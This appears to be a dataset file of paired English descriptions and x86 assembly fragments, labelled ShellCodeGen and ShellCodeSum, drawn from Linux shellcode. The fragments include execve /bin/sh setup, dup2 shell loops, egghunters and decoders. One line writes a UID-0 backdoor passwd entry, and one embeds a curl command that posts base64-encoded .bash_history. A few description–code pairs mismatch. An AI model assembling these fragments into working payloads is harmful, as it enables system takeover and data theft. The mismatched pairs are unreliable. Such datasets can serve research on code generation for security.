ShellCodeGen: add the byte in edi to the al register,"add al, byte [edi]"
ShellCodeSum: push 0x30317974,push 0x30317974 onto the stack
ShellCodeGen: define the code label,code:
"ShellCodeSum: xor ecx, ecx",set the ecx register to null
ShellCodeSum: push byte 15,push the byte 15 to the stack
ShellCodeSum: stageaddress:,declare the stageaddress label
ShellCodeGen: subtract the decimal value 48 from the nl register,"sub bl, 48"
ShellCodeGen: pop the value on the stack back into eax,pop eax
"ShellCodeSum: push dword 0x39396e2d \n mov esi, esp",push double word 0x39396e2d onto the stack and point the esi register to the stack register
ShellCodeGen: load the effective address [ebx] into edi,"lea edi, [ebx]"
"ShellCodeSum: mov eax, ebx",move ebx to eax
"ShellCodeSum: add edx, 48",add 48 to edx
"ShellCodeSum: add cl, 0x2",add 0x2 to the contents in cl and save the result in cl
ShellCodeSum: section .bss,declare bss section
ShellCodeGen: define the loop label,loop:
ShellCodeSum: push byte 25,push the byte 25 onto the stack
ShellCodeGen: declare message string msg1 containing 'hello brave new world!',"msg1 db 'hello, brave new world!', 0ah"
ShellCodeGen: push the dword 0x61702f63 onto the stack,push dword 0x61702f63
"ShellCodeSum: cmp al, 0xf2",compare if the contents of al with 0xf2
"ShellCodeSum: mov [bp+0x3e], ax",move the contents of the ax register at the memory location specified by the operation [bp+0x3e]
ShellCodeGen: move the contents of memory address ebx+esi into ebx,"mov ebx, [ebx+esi]"
ShellCodeGen: call the shellcode function,call shellcode
ShellCodeGen: move 2 into cl,"mov cl, 2"
ShellCodeGen: move the value 0x5 into the bl register,"mov bl, 0x5"
"ShellCodeSum: mov ecx, edx",move the contents of the edx register into the ecx register
"ShellCodeSum: str db 'hello',0",declare 6 bytes starting at the address str initialized to the ascii character values for hello and the null byte
ShellCodeGen: define duploop function,duploop:
"ShellCodeSum: mov cl, 2",move 2 into cl
"ShellCodeSum: mov eax, 63",make the system call to copy the file descriptor
ShellCodeGen: push the contents of the esi register onto the stack.,push esi
"ShellCodeSum: rol byte [esi], 0x1",left rotate the byte in esi 1 time
"ShellCodeSum: hello: db 'hello world!',10",create a string 'hello world!' plus a linefeed character
ShellCodeGen: move 0x2f766564 into eax,"mov eax, 0x2f766564"
"ShellCodeSum: lea ebx, [ebp-8]",load the effective address [ebp-8] into ebx
ShellCodeSum: push 0x65726f43,push 0x65726f43 onto the stack
ShellCodeGen: jump to incaddr if no match,jnz incaddr
ShellCodeSum: mul ebx,multiply eax by ebx
"ShellCodeSum: mov edx, dword 0x65676760",move dword 0x65676760 into edx
ShellCodeGen: push the contents of the edx register onto the stack and point eax to the stack register,"push edx \n mov eax, esp"
ShellCodeGen: move 0xa4 into the byte in al,"mov byte al, 0xa4"
"ShellCodeSum: mov eax, 90",make the system call to map the memory page to a file
ShellCodeGen: add 48 to ebx,"add ebx, 24"
ShellCodeGen: transfer the immediate constant 45h to ax,"mov ax, 45h"
ShellCodeGen: declare the main_push label,main_push:
"ShellCodeSum: push byte 0x5 \n mov edx, esp",push the byte 0x5 onto the stack and point edx to the stack register
"ShellCodeSum: mov eax, 3",system call read
"ShellCodeSum: mov byte [hexstr+edx+1],bl",move a byte from bl into memory address hexstr+edx+1
ShellCodeGen: jump to the loop label if the previous instruction clears the sign flag,jns loop
ShellCodeGen: place address of buffer into ebp,"mov ebp, buff"
ShellCodeGen: jump to the child label if the contents of the eax register is equal to the contents of the ebx register,"cmp eax, ebx \n je child"
ShellCodeGen: push '/etc' onto the stack,push '/etc'
"ShellCodeSum: mov cl, 100",move 100 into cl
ShellCodeGen: load the effective address [esi] into edi,"lea edi, [esi]"
ShellCodeSum: push dword 0x7461632f,push the dword 0x7461632f onto the stack
ShellCodeGen: declare the l00p label,l00p:
ShellCodeGen: if the contents of the cl register is equal to the contents of the dl register then jump to the EncodedShellcode label,"cmp cl, dl \n je EncodedShellcode"
ShellCodeGen: jump short to decode,jmp short decode
ShellCodeSum: push 0x65782e2f,push 0x65782e2f onto the stack
ShellCodeSum: jmp short process_shellcode,jump short to the process_shellcode label
ShellCodeSum: push zero_reg,push the zero_reg onto the stack
"ShellCodeSum: mov al, 4",move 4 into al
"ShellCodeSum: shl edi, 0x1",left shift the contents of the edi register by 0x1 bit
"ShellCodeSum: lea ebx, [ebp+39]",load the effective address of the result of the operation [ebp+39] into the ebx register
"ShellCodeSum: push edx \n mov ecx, esp",push the contents of the edx register onto the stack and point ecx to the stack register
"ShellCodeSum: add eax, 2",add decimal 2 to eax register
"ShellCodeSum: mov ebx, 0",specify file descriptor 0 as standard input
"ShellCodeSum: mov eax, 4",make the system call for write
ShellCodeGen: push the 0x706d742f onto the stack,push 0x706d742f
ShellCodeGen: restore the top of the stack into the edi register,pop edi
"ShellCodeSum: test eax, eax \n jnz l1 \n call myfunct",if the contents of the eax register is not zero then jump to the label l1 else call the function myfunct
ShellCodeGen: if the byte representation of 2 is equal to the contents of the al register then jump to the label do_inject,"cmp BYTE al, 2 \n je do_inject"
ShellCodeSum: push 0x2431243a,push 0x2431243a onto the stack
"ShellCodeSum: mov al, 0x1",move 0x1 into lower byte of the eax register
ShellCodeSum: fileaddress:,declare the fileaddress label
ShellCodeSum: not ecx,negate all the bits of ecx register
"ShellCodeSum: mov byte [esi + 1], dl",move the contents of dl into the byte at the memory location specified by the operation [esi+1]
"ShellCodeSum: mov dh, 0x35",move 0x35 into dh
ShellCodeSum: push_cmd:,declare the push_cmd label
ShellCodeSum: mul 0x10,multiply eax by 0x10 and stores the result in edx:eax
"ShellCodeSum: mov cl, shellcode_length",move shellcode_length into cl
ShellCodeSum: push byte 28 \n pop eax,put the syscall 28 into the eax register
ShellCodeGen: push edi to the stack,push edi
ShellCodeSum: jmp read,jump to label read
ShellCodeSum: db 0x80,declare an unlabeled byte initialized to 0x80
ShellCodeSum: jmp short main,jump short to the main label
ShellCodeGen: move esi into ebx,"mov ebx, esi"
ShellCodeGen: define msg2 as the byte string 'passwd',"msg2 db 'passwd', 0x00"
"ShellCodeSum: shl eax, 28",left shift the contents of eax register by 28 bit positions
ShellCodeGen: if the contents of the eax register is zero then jump short to the memory location loc_402C13,"test eax, eax \n jz short loc_402C13"
ShellCodeGen: perform a logical xor operation between eax and 0x7575,"xor eax, 0x7575"
ShellCodeSum: push dword 0x61702f63,push the dword 0x61702f63 onto the stack
ShellCodeGen: add the contents of ebx to the contents of eax,"add eax, ebx"
"ShellCodeSum: mov bl, 0x2",move 0x2 into bl
ShellCodeSum: _shell:,define the _shell label
"ShellCodeSum: xchg edi, eax",swap the values of edi and eax registers
ShellCodeGen: move msg to ecx,"mov ecx, msg"
ShellCodeSum: write_syscall equ 4,define write_syscall equal to 4
"ShellCodeSum: mov ecx, [ebp+12]",move the contents at the memory location specified by the result of the operation [ebp+12] into the ecx register
"ShellCodeSum: mov eax, buffer",move the memory address of buffer variable into eax
"ShellCodeSum: mov edi, edx",move edx into edi
ShellCodeGen: move 2001Q into cx,"mov cx, 2001Q"
ShellCodeSum: ja next,jump to next label if the destination is greater than the source in the above comparison
"ShellCodeSum: xor cl, 0XAA \n jz shift_decode",jump to the shift_decode label if the result of the logical xor between the cl register and the value 0xAA is zero
"ShellCodeSum: mov esi, v",move v to esi
"ShellCodeSum: mov [esp + 1], cl",move cl into the address [esp + 1]
ShellCodeSum: push dword 0x2f2f6e69,push the doubleword 0x2f2f6e69 to the stack
"ShellCodeSum: cmp dword [eax], ebx \n jne next_addr \n jmp eax",if the doubleword starting at the address contained in the eax register is not equal to the contents of the ebx regoster then jump to the next_address label else jump to the eax register
ShellCodeGen: add 0x2 to the contents in bl and save the result in bl,"add bl, 0x2"
ShellCodeGen: push the 0x203a4457 onto the stack,push 0x203a4457
"ShellCodeSum: cmp [esi], edx",compare the contents at memory location esi and the contents of the edx register
ShellCodeGen: create label main_inc,main_inc:
"ShellCodeSum: push esi \n mov ecx, esp",push the contents of the esi register onto the stack and point ecx to the stack register
ShellCodeGen: swap the contents of the eax register with the contents of the edx register,"xchg eax, edx"
ShellCodeSum: real_number1 dd 1234,define the doubleword variable real_number1 and initialize to 1234
ShellCodeGen: define format label,format:
"ShellCodeSum: shl cx, 1",left shift cx
ShellCodeGen: compare the contents of the eax register with doubleword at edi and set status flags,scasd
"ShellCodeSum: cmp bl, 0xaa \n je shellcode",if the contents of the bl register is equal to the value 0xaa then jump to the shellcode label
ShellCodeGen: move /bin/sh into the edx register,"push 0x68732f2f \n push 0x6e69622f \n mov edx, esp"
ShellCodeSum: call_write:,define the call_write label
"ShellCodeSum: mov eax, 3",invoke sys_read
ShellCodeSum: jmp entrypoint,jump to the entrypoint label
ShellCodeGen: multiply eax by the contents of the edx register,mul edx
ShellCodeSum: push word 0x3436,push the word 0x3436 onto the stack
ShellCodeGen: move edi into the local memory address ebp-4,"mov [ebp-4], edi"
ShellCodeGen: define the _return label,_return:
ShellCodeSum: google: db '127.1.1.1 google.com',define the byte string google and initialize it to '127.1.1.1 google.com'
"ShellCodeSum: test eax, eax \n jz check_html",jump to the label check_html if the contents of the eax register is zero
ShellCodeGen: if the contents of the eax register is not zero then jump to the label l1,"test eax, eax \n jnz l1"
ShellCodeGen: reserve 1 byte for number variable,number: resb 1
ShellCodeSum: pushw 0x682d,push the 0x682d onto the stack
ShellCodeGen: decrement the contents of the ecx register and jump to the dup2loop label if the result is not negative,dec ecx \n jns dup2loop
ShellCodeGen: jump to the l2 label if the unsigned contents of the al register is greater than the unsigned contents of the bl register else add the value 3 to the eax register,"cmp al, bl \n ja l2 \n add eax, 3"
"ShellCodeSum: shr eax, 16",right shift the contents of eax register by 16 bit positions
ShellCodeGen: increment the contents of the eax register,inc eax
ShellCodeGen: set the ecx register to null,"xor ecx, ecx"
ShellCodeGen: move al into the byte at address [ebx + 35],"mov byte [ebx + 35], al"
ShellCodeGen: if the contents of the bl register is less than the value 78h then jump to the memory location loc_402B1D,"cmp bl, 78h \n jl short loc_402B1D"
ShellCodeGen: compare if esi is equal to 10,"cmp esi, 10"
ShellCodeGen: negate the contents of eax,neg eax
"ShellCodeSum: mov eax, 1",specify exit syscall
ShellCodeGen: push the byte 28 to the stack,push byte 28
"ShellCodeSum: xor eax, eax \n cmp edx, eax \n jne l3",zero out the eax register and jump to the l3 label if the contents of the edx register is not equal to the contents of the eax register
ShellCodeSum: mul 3,multiply the contents of eax by 3
ShellCodeSum: push byte 2,push byte 2 onto the stack
ShellCodeGen: compare the contents stored at ebp+arg_0 with 1,"cmp [ebp+arg_0], 1"
ShellCodeSum: push 0x32322e32,push 0x32322e32 to the stack
ShellCodeSum: int 0x80,execute the reboot syscall
ShellCodeGen: declare the todo label,todo:
"ShellCodeSum: sub byte [esi], 0xd",subtract 0xd from the byte at the address esi
ShellCodeGen: initialize a string to 'egg mark',db 'egg mark'
ShellCodeSum: shellcode: db 'vl43ck:$6$bxwJfzor$MUhUWO0MUgdkWfPPEydqgZpm.YtPMI/gaM4lVqhP21LFNWmSJ821kvJnIyoODYtBh.SF9aR7ciQBRCcw5bgjX0:0:0:vl43ck:/tmp:/bin/bash',define the array of bytes shellcode and initialize it to vl43ck:$6$bxwJfzor$MUhUWO0MUgdkWfPPEydqgZpm.YtPMI/gaM4lVqhP21LFNWmSJ821kvJnIyoODYtBh.SF9aR7ciQBRCcw5bgjX0:0:0:vl43ck:/tmp:/bin/bash
"ShellCodeSum: xor ecx, ecx",clear the ecx register
ShellCodeGen: push the 0x7665642f onto the stack,push 0x7665642f
ShellCodeGen: declare the createfile label,createfile:
ShellCodeSum: message db '/bin/sh',define message byte and initialize it to '/bin/sh'
"ShellCodeSum: test eax, eax \n jnz checkforfile",if the contents of the eax register is not zero then jump to the label checkforfile
"ShellCodeSum: mov eax, 11",system call execve
ShellCodeSum: scasd \n l1 IncAddr \n jmp edi,jump to the l1 label if the value in the eax register is not equal to the doubleword addressed by edi else jump to the edi register
ShellCodeGen: move al into memory address a_letter,"mov a_letter, al"
ShellCodeGen: jump to 2f if the sign flag is zero,jns 2f
ShellCodeSum: push dword 0x214c4f4c,push the dword 0x214c4f4c onto the stack
ShellCodeGen: move 0x5 into ebx,"mov ebx, 0x5"
ShellCodeGen: move an ascii linefeed character into eax,"mov eax, 0ah"
ShellCodeSum: push byte 0x2,push the byte 0x2 to the stack
"ShellCodeSum: sub ecx, ecx",subtract ecx from ecx and save the result into ecx
ShellCodeGen: left shift the contents of edx register by 9 bit positions,"shl edx, 9"
ShellCodeSum: main:,create main label
ShellCodeGen: subtract 1662 from ax and save the result into ax,"sub ax, 1662"
ShellCodeGen: push 0x32322e32 onto the stack,push 0x32322e32
ShellCodeGen: define shift_decode label,shift_decode:
ShellCodeGen: push the value 0x69622f2f onto the stack and point the eax register to the stack register,"push 0x69622f2f \n mov eax, esp"
ShellCodeSum: push zero_reg,push zero_reg onto the stack
ShellCodeGen: declare the array of words word_table initialized to 134 345 564 and 123,"word_table dw 134, 345, 564, 123"
ShellCodeGen: zero out bx register,"xor bx,bx"
"ShellCodeSum: sub esp, byte 0x1",subtract the byte value 0x1 from esp register and save the result in esp
ShellCodeGen: move the contents of eax into address defined by ebp+var_a,"mov [ebp+var_a], eax"
"ShellCodeSum: cmp dword [eax], ebx \n jne next_addr \n jmp eax",jump to the next_address label if the doubleword starting at the address contained in the eax register is not equal to the contents of the ebx regoster else jump to the eax register
ShellCodeSum: push 1,push 1 to the stack
ShellCodeGen: if the contents of the bl register is equal to the contents of the al register then jump to the loop_2 label,"cmp bl, al \n je loop_2"
ShellCodeGen: define decode label,decode:
ShellCodeGen: move 1 into edx,"mov edx, 1"
ShellCodeSum: loop .3,decrement the counter and jump to .3 label if the count is not zero
"ShellCodeSum: mov edi, 876189623",move 876189623 into edi
"ShellCodeSum: mov bl, byte [esi+ecx+1]",move the byte at the address [esi+ecx+1] into bl
"ShellCodeSum: mov word [ebx], 2",move the 16-bit integer representation of 2 into the 2 bytes starting at the address in ebx
ShellCodeGen: move 0x17 into al,"mov al, 0x17"
ShellCodeGen: move permissions to read write and execute into ecx,"mov ecx, 0777"
ShellCodeGen: jump short to 0x34,jmp short 0x34
ShellCodeGen: move al into the address [esp+57],"mov [esp+57], al"
ShellCodeSum: push 0x6475732f,push 0x6475732f to the stack
ShellCodeSum: int 0x80,execute exit syscall
ShellCodeGen: move the contents stored at the address len into the dl register,"mov dl, len"
ShellCodeGen: declare a word uninitialized value referred to as location x,x dw ?
"ShellCodeSum: test eax, eax \n jz close \n mov ebx, edx",if the contents of the eax register is zero then jump to the label close else move the contents of the edx register into the ebx register
ShellCodeSum: nop,do nothing
ShellCodeSum: push word cx,push the word cx onto the stack
ShellCodeGen: push 0x5 onto the stack,push 0x5
ShellCodeGen: create a string filename and initialize to 'readme.txt',"filename: db 'readme.txt', 0h"
"ShellCodeSum: sub bx, 1634",subtract 1634 from the contents of the bx register
ShellCodeGen: move 1 into ecx,"mov ecx, 1"
"ShellCodeSum: mov bl, 0x04",move 0x04 into bl
ShellCodeGen: move /bin/sh into the ebx register,"push long 0x68732f2f \n push long 0x6e69622f \n mov ebx, esp"
ShellCodeGen: move dl into the byte at address [eax],"mov byte [eax], dl"
ShellCodeGen: push the byte 1 onto the stack,push byte 1
"ShellCodeSum: mov al, 0xf",move 0xf into al
ShellCodeSum: push word 0xc005,push the word 0xc005 to the stack
ShellCodeGen: move 0x65636170 into esi,"mov esi, 0x65636170"
"ShellCodeSum: push 0x68732f2f \n push 0x6e69622f \n mov ebx, esp",move ASCII /bin/sh into ebx
"ShellCodeSum: mov bl, 0x02",move 0x02 into bl
ShellCodeSum: jz child,if zero jump to the child label
ShellCodeGen: move ASCII /bin/sh into ecx,"push 0x68732f2f \n push 0x6e69622f \n mov ecx, esp"
ShellCodeGen: move esi into edx,"mov edx, esi"
ShellCodeSum: push eax,push the contents of eax onto the stack
ShellCodeGen: increment the memory variable count,inc count
"ShellCodeSum: cmp DWORD [eax], edx \n jne search_the_egg \n jmp eax",if the doubleword starting at the address contained in the eax register is not equal to the contents of the edx register then jump to the while label else jump to the eax register
ShellCodeGen: jump to the l1 label if the unsigned contents of the ecx register is greater than the unsigned contents of the edx register,"cmp ecx, edx \n ja l1"
ShellCodeGen: decrement esp,dec esp
ShellCodeGen: if the contents of the bl register is equal to the contents of the al register then jump to the loop_2 label else jump short to the not_found label,"cmp bl, al \n je loop_2 \n jmp short not_found"
ShellCodeSum: call _continue,call the _continue function
ShellCodeGen: push the contents of the ebx register onto the stack,push ebx
"ShellCodeSum: push 0x2f2f2f2f \n mov ecx, esp",push the value 0x2f2f2f2f onto the stack and point ecx to the stack register
"ShellCodeSum: cmp al, 0xf2 \n jz incpage",if the contents of the al register is equal to the value 0xf2 then jump to the incpage label
ShellCodeGen: add decimal integer 2 to ebx,"add ebx, 2"
"ShellCodeSum: mov eax, [temp]",move the contents at memory specified by temp into eax
"ShellCodeSum: sub bl, 3 \n jnz stage",subtract the value 3 from the contents of the bl register and jump to the stage label if the result is not zero
ShellCodeSum: div ecx,divide eax by ecx
ShellCodeSum: close_syscall equ 6,define close_syscall equal to 6
"ShellCodeSum: add esi, 0x33333333",add 0x33333333 value to esi
ShellCodeGen: move eax into edi,"mov edi, eax"
ShellCodeGen: define the callpop label,callpop:
ShellCodeGen: multiply the contents of eax by the 32-bit contents of the memory location tmp,mul [tmp]
ShellCodeSum: push byte 0x64,push the byte 0x64 onto the stack
ShellCodeGen: move stack pointer to eax,"mov eax, esp"
ShellCodeSum: download:,declare the download label
"ShellCodeSum: add edx, 64",add 64 to the contents of the edx register
ShellCodeSum: push byte 0x43,sigaction
ShellCodeGen: remove last character from the stack into ebx,pop ebx
ShellCodeSum: dec dl,decrement the dl register by one
ShellCodeGen: push 0x6962732f onto the stack,push 0x6962732f
"ShellCodeSum: mov [ebx+7], al",move al into ebx+7
ShellCodeSum: push 0x5,push 0x5 onto the stack
ShellCodeGen: push zero onto the stack,"xor edx, edx \n push edx"
"ShellCodeSum: mov eax, 1",move 1 into eax
ShellCodeGen: declare var byte variable and initialize it to 32,var db 32
ShellCodeGen: push the byte 0x0b onto the stack,push byte 0x0b
"ShellCodeSum: sub eax, [esp]",subtract the value of the memory at address esp from eax and store into eax
ShellCodeGen: define file as the byte string '/sbin/iptables#-f',file: db '/sbin/iptables#-f'
ShellCodeSum: jmp short callit,jump short to the callit label
ShellCodeGen: perform the xor operation between the contents of the ax register and the value 0x7777,"xor ax, 0x7777"
ShellCodeSum: push 0x68732f6e,push the 0x68732f6e onto the stack
ShellCodeGen: call the one function,call one
ShellCodeSum: variablename3: resd 1,reserve 1 double word for variableName3
"ShellCodeSum: sub eax, ebx",subtract ebx from eax
"ShellCodeSum: shl edx, 2",multiply edx by 4 using left shift
ShellCodeSum: push 0x7361702f,push 0x7361702f onto the stack
ShellCodeSum: push 0x3e0a7964,push 0x3e0a7964 onto the stack
ShellCodeGen: push ebx on the stack,push ebx
ShellCodeGen: jump to the label no_error if not equal,jne no_error
"ShellCodeSum: push dword 0x39396e2d \n mov edi, esp",push double word 0x39396e2d onto the stack and point the edi register to the stack register
ShellCodeGen: system call waitpid,"mov eax, 7"
"ShellCodeSum: sub bx, 1634",subtract 1634 from bx and save the result into bx
ShellCodeGen: declare the egghunter label,egghunter:
"ShellCodeSum: mov eax, 4",specify sys_write syscall
"ShellCodeSum: shr eax, 1",divide eax by 2 using right shift
"ShellCodeSum: cmp BYTE bl, [esi] \n jne loop_1",jump to the label loop_1 if the first byte of the esi register is not equal to the contents of the bl register
"ShellCodeSum: cmp cl, dl \n je init \n inc cl",if the contents of the cl register is equal to the contents of the dl register then jump to the init label else increment the contents of the cl register
ShellCodeGen: decrement the contents of the ecx register and jump to the _dup2_loop label if the result is not negative,dec ecx \n jns _dup2_loop
ShellCodeSum: push byte 6,push byte 6 onto the stack
ShellCodeGen: move address of stack pointer into edx,"mov edx, esp"
ShellCodeGen: move edx into eax,"mov eax, edx"
"ShellCodeSum: mov byte [edx+eax], bl",move bl into byte edx+eax
ShellCodeGen: jump to the all label if the contents of the eax register is equal to the contents of the ebx register else zero out the eax register,"cmp eax, ebx \n je all \n xor eax, eax"
ShellCodeSum: loopnz L2 \n push eax,decrement the ecx register and jump to the L2 label if the contents of the ecx register is not zero and the zero flag is zero else push the contents of the eax register onto the stack
ShellCodeGen: push the dword [ebp+16] onto the stack,push dword [ebp+16]
ShellCodeGen: move ebx to eax,"mov eax, ebx"
ShellCodeGen: swap the values of edi and eax registers,"xchg edi, eax"
ShellCodeSum: push bx,push bx onto the stack
"ShellCodeSum: cmp ecx, 0",compare if ecx is zero
ShellCodeGen: load the effective address of the result of the operation [esi+35] into the ecx register,"lea ecx, [esi+35]"
ShellCodeGen: if the contents of the eax register is not zero then jump short to the label _parent,"test eax, eax \n jnz short _parent"
ShellCodeGen: move the value 20 into bx,"mov bx, 20"
ShellCodeGen: push the word 0xffff onto the stack,push word 0xffff
"ShellCodeSum: port: db 0xd4, 0x31, 0xc0, 0xa8, 0x3, 0x77","define port as an array of bytes and initialize it to 0xd4, 0x31, 0xc0, 0xa8, 0x3, 0x77"
ShellCodeGen: increment bx,inc bx
"ShellCodeSum: add edx, eax",add the contents of the eax register to the contents of edx register
ShellCodeGen: jump to 3f if the sign flag is zero,jns 3f
ShellCodeGen: if the contents of the eax register is not equal to the contents of the ebx register then jump to the retry label,"cmp eax, ebx \n jne retry"
ShellCodeSum: jne retry,jump to retry if not equal
ShellCodeGen: push 0x68737a2f onto the stack,push 0x68737a2f
ShellCodeGen: jump to the call_egghunter label,jmp call_egghunter
ShellCodeSum: jmp aslr_file,jump to the aslr_file label
ShellCodeGen: define do_dup label,do_dup:
"ShellCodeSum: xchg ebx, eax",swap the values of ebx and eax
"ShellCodeSum: test eax, eax \n jz close",jump to the label close if the contents of the eax register is zero
"ShellCodeSum: lea ecx, [ebp+28]",load the effective address [ebp+28] into ecx
ShellCodeGen: decrement the ecx register and jump to the l1 label if the contents of the ecx register is not zero else move the contents of the esp register into the eax register,"loop l1 \n mov eax, esp"
ShellCodeSum: loader:,declare the loader label
ShellCodeGen: push the word 0x6465 onto the stack,push word 0x6465
ShellCodeGen: define the string message and initialize it to '/etc/passwd',message db '/etc/passwd'
ShellCodeGen: left shift the contents of al by 4 bit positions,"shl al, 4"
"ShellCodeSum: xor bl, 0xBB \n jz formatting",jump to the formatting label if the result of the logical xor between the bl register and the value 0xBB is zero
ShellCodeGen: push 0x2e373231 onto the stack,push 0x2e373231
"ShellCodeSum: sub bx, dx",subtract the contents of the dx register from the contents of the bx register
ShellCodeGen: push 0x622f7273 onto the stack,push 0x622f7273
ShellCodeGen: push the value 0x6e7a762d onto the stack and point the esi register to the stack register,"push 0x6e7a762d \n mov esi, esp"
ShellCodeGen: subtract 1663 from bx and save the result into bx,"sub bx, 1663"
ShellCodeGen: subtract 88 from the contents of al register and save the result in al,"sub al, 88"
ShellCodeGen: move 10 into eax,"mov eax, 10"
ShellCodeGen: move /bin/sh into the eax register,"push 0x68732f2f \n push 0x6e69622f \n mov eax, esp"
ShellCodeGen: push the contents of the edi register onto the stack and point eax to the stack register,"push edi \n mov eax, esp"
ShellCodeGen: zero out the ecx register and jump to the l1 label if the contents of the ebx register is not equal to the contents of the ecx register,"xor ecx, ecx \n cmp ebx, ecx \n jne l1"
ShellCodeSum: push word 0x3905,push the word 0x3905 onto the stack
ShellCodeGen: push the byte 54 onto the stack,push byte 54
"ShellCodeSum: add byte_value, dl",add the register dl in the memory location byte_value
ShellCodeGen: invoke sys_execve,"mov eax, 11"
ShellCodeGen: push ebx to the stack,push ebx
ShellCodeSum: jns 2f,jump to 2f if the sign flag is zero
"ShellCodeSum: sar eax, 31",right shift the contents of eax by 31 bits
ShellCodeSum: db '/bin/sh#sh#',define the byte string '/bin/sh#sh#'
ShellCodeGen: make the system call to the kernel,int 0x80
"ShellCodeSum: mov ebx, esp",move address of stack pointer into ebx
"ShellCodeSum: msg db 'curl http://localhost:8080 -d 'data='$(cat .bash_history | base64 -w 0) -x post', 0x0a",define msg as the byte string 'curl http://localhost:8080 -d 'data='$(cat .bash_history | base64 -w 0) -x post'
"ShellCodeSum: or cx, 0xfff",perform logical or between the cx register and 0xfff
ShellCodeSum: pop ecx,restore the top of the stack into the ecx register
"ShellCodeSum: mov x, eax",move eax to x variable
ShellCodeGen: decrement the contents of the ecx register and jump to the loop label if the result is not negative,dec ecx \n jns loop
ShellCodeGen: add 2 to the contents of the ebx register,"add ebx, 2"
ShellCodeGen: jump to the exit label if the contents of the eax register is equal to the contents of the ebx register,"cmp eax, ebx \n je exit"
ShellCodeSum: string: db 'file.txt',define string as the byte string 'file.txt'
ShellCodeGen: move the memory address of message string into ecx,"mov ecx, msg"
ShellCodeGen: compare ecx with 5,"cmp ecx, 5"
"ShellCodeSum: cmp dl, cl \n jb l1 \n mov al, 0x39",if the unsigned contents of the dl register is lower than the unsigned contents of the cl register then jump to the label l1 else move the value 0x39 to the al register
ShellCodeGen: push esi onto the stack,push esi
ShellCodeGen: jump to the exit label if the destination operand is greater than the source operand in the above comparison,ja exit
ShellCodeGen: define the doubleword variable real_number2 and initialize 123456,real_number2 dd 123456
ShellCodeGen: move 0666 into cx,"mov cx, 0666"
ShellCodeGen: clear edx register,"xor edx, edx"
ShellCodeGen: jump to the label exeunt if the contents of the ax register is not zero else jump to the label carryon,"test ax, ax \n jnz exeunt \n jmp carryon"
ShellCodeSum: push eax,push the contents of eax register onto the stack
"ShellCodeSum: mov esi, ecx",move ecx into esi
"ShellCodeSum: mov eax, msg2",move the address of msg2 into eax
"ShellCodeSum: mov byte [esp], 0x2f",move 0x2f into the byte in esp
ShellCodeSum: loop:,declare the loop label
"ShellCodeSum: xor ebx, ebx \n mul ebx",zero out the eax and ebx register
ShellCodeGen: push 0x79616c70 onto the stack,push 0x79616c70
"ShellCodeSum: add cl, 0xb8",add 0xb8 to the cl register
ShellCodeGen: add 0xb8 to the cl register,"add cl, 0xb8"
ShellCodeGen: jump to label l20,jmp l20
ShellCodeGen: push the byte 37 onto the stack,push byte 37
ShellCodeGen: push address of string print_msg,push offset printf_msg
"ShellCodeSum: lea bx, [bp+0x08]",load the effective address of the operation [bp+0x08] into the bx register
ShellCodeSum: push 0x0a3a7964,push 0x0a3a7964 onto the stack
ShellCodeGen: if not zero jump to numeric label 1,jnz 1
ShellCodeGen: put the syscall 0x3 into the eax register,push byte 0x3 \n pop eax
ShellCodeGen: move 0x3 into al,"mov al, 0x3"
ShellCodeSum: push dword 0x5f657a69,push the dword 0x5f657a69 onto the stack
ShellCodeGen: decrease ebx by 2,"sub ebx, 2"
ShellCodeGen: move the value 10 into the cl register then decrement the contents of the cl register and jump to the l1 label if the result is not zero,"mov cl, 10 \n dec cl \n jnz l1"
ShellCodeSum: push sock_reg,push sock_reg onto the stack
ShellCodeGen: move the contents of the ebp register into the esp register,"mov esp, ebp"
ShellCodeGen: if the contents of the eax register is negative then jump to the label old_dirent,"test eax, eax \n js old_dirent"
ShellCodeGen: subtract 0x013ffeff from the contents in eax and save the result in eax,"sub eax, 0x013ffeff"
"ShellCodeSum: mov ecx, [x]",move the contents at memory address x to ecx
ShellCodeSum: push byte 70 \n pop eax,put the syscall 70 into the eax register
"ShellCodeSum: add al, byte '0'",add byte '0' to al
"ShellCodeSum: mov dword [esp-12], 0x6374652f",move 0x6374652f into the dword at address [esp-12]
"ShellCodeSum: mov al, [esi]",move the contents of the esi register into the al register
ShellCodeGen: define chmod_call equal to 15,chmod_call equ 15
ShellCodeGen: move the contents at memory address x to ecx,"mov ecx, [x]"
"ShellCodeSum: cmp eax, ebx \n je download",if the contents of the eax register is equal to the contents of the ebx register then jump to the download label
ShellCodeGen: put the syscall 0x05 into the eax register,push byte 0x05 \n pop eax
ShellCodeSum: pop eax,put syscall value into eax
ShellCodeGen: load the effective address of esi into the ebx register,"lea ebx, [esi]"
ShellCodeGen: define msg_len equal to the length of msg,msg_len equ $-msg
ShellCodeGen: initialize edx with the decimal value 0,"xor edx, edx"
ShellCodeSum: push 0x622f7273,push 0x622f7273 onto the stack
ShellCodeGen: move 0xf into al,"mov al, 0xf"
"ShellCodeSum: mov edx, 13",move 13 into edx
ShellCodeGen: jump to the download label if the contents of the eax register is equal to the contents of the ebx register,"cmp eax, ebx \n je download"
ShellCodeGen: push the word 2 onto the stack and point ecx to the stack register,"push word 2 \n mov ecx, esp"
ShellCodeSum: push dword 0x8140a8c0,push the doubleword 0x8140a8c0 to the stack
ShellCodeSum: push word 0x02,push the word 0x02 onto the stack
ShellCodeGen: add 4 to the contents of the esi register,"add esi, 4"
"ShellCodeSum: mov eax, 7",make the system call waitpid
ShellCodeGen: invoke sys_close,"mov eax, 6"
ShellCodeGen: declare the shift_decode label,shift_decode:
ShellCodeGen: move 077o into cl,"mov cl, 077o"
ShellCodeSum: push word 0x7773,push the word 0x7773 onto the stack
ShellCodeSum: db '/bin/sh',define the byte string '/bin/sh'
"ShellCodeSum: lea edx, [esi+26]",load the effective address of the result of the operation [esi+26] into the edx register
"ShellCodeSum: mov ax, 1666",move 1666 into ax
"ShellCodeSum: mov ebx, esp",push /bin/sh into ebx
ShellCodeGen: jump to the memory address 0x47 if the contents of the eax register is equal to the contents of the edi register,"cmp eax, ebx \n je 0x47"
ShellCodeGen: move 0xffffffff into eax,"mov eax, 0xffffffff"
ShellCodeGen: push '//pa' onto the stack,push '//pa'
ShellCodeGen: call sys_write,int 80h
ShellCodeSum: call_shellcode:,define call_shellcode function
ShellCodeGen: create a new process,"mov eax, 2"
ShellCodeGen: push the 0x10 onto the stack,push 0x10
ShellCodeGen: push the 0x3170762d onto the stack,push 0x3170762d
ShellCodeGen: move 132 to eax 132,"mov eax, 132"
"ShellCodeSum: mov eax, 106",stat
ShellCodeGen: push the contents of the ebx register onto the stack and point edx to the stack register,"push ebx \n mov edx, esp"
